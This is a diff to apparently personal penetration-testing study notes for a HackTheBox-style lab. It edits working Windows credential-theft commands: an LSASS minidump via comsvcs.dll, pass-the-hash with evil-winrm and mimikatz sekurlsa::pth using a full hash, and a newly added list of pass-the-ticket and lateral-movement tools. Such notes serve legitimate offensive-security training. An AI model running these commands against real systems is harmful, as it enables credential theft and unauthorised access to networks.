@@ -110,7 +110,7 @@ Windows::
   https://github.com/gentilkiwi/mimikatz
   https://github.com/login-securite/DonPAPI
 
-  netexec / CrackMapExec:  dumping and decrypt LSA, SAM
+  netexec / CrackMapExec (old nxc):  dumping and decrypt LSA, SAM
 
   Get-Process lsass
   rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
@@ -140,7 +140,7 @@ copy NTDS.dit from C:
 Pass the hash (PtH):
   evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
 
-  mimikatz.exe privilege::debug "sekurlsa::pth /user:julio exit      (search for hashes)
+  mimikatz.exe privilege::debug "sekurlsa::pth /user:julio" exit      (search for hashes)
   mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
 
   PS c:\htb> cd C:\tools\Invoke-TheHash\
@@ -202,6 +202,13 @@ NetExec (nxc):
 
 
 Pass the Tickets (PtT):
-  
+  mimikatz
+  Invoke-SMBExec  /  Invoke-WMIExec 
+  impacket-psexec  / wmiexec  /  atexec  / wmiexec
+  netexec smb
+  evil-winrm
+  reg by nxc + RDP
+
+
 
 
